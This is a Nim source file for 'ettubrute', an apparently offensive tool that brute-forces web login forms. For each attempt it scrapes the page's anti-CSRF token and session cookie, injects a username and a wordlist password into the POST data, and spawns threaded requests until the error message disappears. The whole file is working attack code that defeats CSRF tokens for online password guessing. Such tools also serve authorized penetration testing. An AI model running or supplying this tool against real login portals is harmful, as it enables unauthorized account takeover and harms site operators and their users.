from os import sleep, splitPath; from uri import encodeUrl; from times import epochTime
import httpclient, docopt, strutils, threadpool, system, avxcount

# banner, args, and variables
let banner = """
              .               .                        .o8                                .
            .o8             .o8                       "888                              .o8
 .ooooo.  .o888oo         .o888oo oooo  oooo           888oooo.  oooo d8b oooo  oooo  .o888oo  .ooooo.
d88' `88b   888             888   `888  `888           d88' `88b `888""8P `888  `888    888   d88' `88b
888ooo888   888   8888888   888    888   888  8888888  888   888  888      888   888    888   888ooo888
888    .o   888 .           888 .  888   888           888   888  888      888   888    888 . 888    .o
`Y8bod8P'   "888"           "888"  `V88V"V8P'          `Y8bod8P' d888b     `V88V"V8P'   "888" `Y8bod8P'

                                     It's March 15th, Julius CSRF.
"""
let doc = """
Usage: ettubrute <login_url> <csrf_htmlname> <wordlist> <postdata_nocsrf> <username> <errormsg>

It's March 15th, Julius CSRF.

Postdata should have '^USER^' and '^PASS^' substituted in for fuzz positioning."""

var
  login_url: string
  token_name: string
  postdata: string
  wordlist: string
  username: string
  errormsg: string
  timetaken = epochTime()
  args      = docopt(doc)
  count     = 0

# There's a better way to validate variables using docopt, but I'm fine with this.
try:
  login_url = $args["<login_url>"]
  token_name = $args["<csrf_htmlname>"]
  postdata = $args["<postdata_nocsrf>"]
  wordlist = $args["<wordlist>"]
  username = $args["<username>"]
  errormsg = $args["<errormsg>"]
except:
  echo banner
  echo doc
  quit()

# Verify that we know where to inject username and password.
if "^USER^" in postdata == false or "^PASS^" in postdata == false:
  echo banner
  echo doc
  quit()

# Trap ctrl+c, initialize program
proc handler() {.noconv.} =
  echo "\n[!] Caught CTRL+C [!]\n--- Ending bruteforce ----"
  sync()
  echo("\nRan for " & split($formatFloat(epochTime() - timetaken), ".")[0] & " seconds, tried " & $count & " passwords")
  quit()

echo banner
setControlCHook(handler)
var
  linecount = parseInt($fastCount(wordlist)) # Ultrafast linecount for large files using avxcount.nim by aboisvert
  sleeptime = 2 # Change this to a higher number if you're getting filesystem errors or if the webserver is very slow.
echo("Starting file " & splitPath(wordlist).tail & ", " & $linecount & " lines.\n")

# Define the procedure our threads will run
proc main(loginURL:string,tokenName:string,postData:string,uname:string,pword:string,errorMsg:string,linenum:int):string {.thread.} =
  var
    http  = newHttpClient()
    fetch = http.request(loginURL, httpMethod = HttpGet)
    page0 = rsplit(fetch.body, tokenName, maxsplit = 1)[1] # Chopping up the reply to grab our token
    page1 = split(page0, "=\"", maxsplit = 1)[1]
    token = split(page1, "\">", maxsplit = 1)[0]
    page2:string
    cookie:string
  if "cookie" in $fetch.headers: # Written for single PHP cookie. Might need patching if the server sets many cookies.
    page2  = split($fetch.headers, "\"set-cookie\": @[\"")[1]
    cookie = split(page2, "; ")[0]
  var
    inputData    = postData.replace("^USER^", uname).replace("^PASS^", encodeUrl(pword)) & "&" & tokenName & "=" & token
    cookieHeader = newHttpHeaders({"Cookie": cookie})
    response     = http.request(loginURL & "?" & inputData, httpMethod = HttpPost, headers = cookieHeader) # Try password
  echo("  --> " & pword)
  if errorMsg in response.body == false and "field is required." in response.body == false:
    echo("Password seems to have been found! -> " & pword)
    quit()
  close(http)

# Start hurling passwords at the portal in individual threads
for line in lines wordlist:
  if count == linecount:
    echo "[!] Nearing end of list [!]"
  discard spawn main(login_url, token_name, postdata, username, line, errormsg, count)
  count += 1
  sleep(sleeptime)
sync()
echo("\nRan for " & split($formatFloat(epochTime() - timetaken), ".")[0] & " seconds, tried " & $count & " passwords")
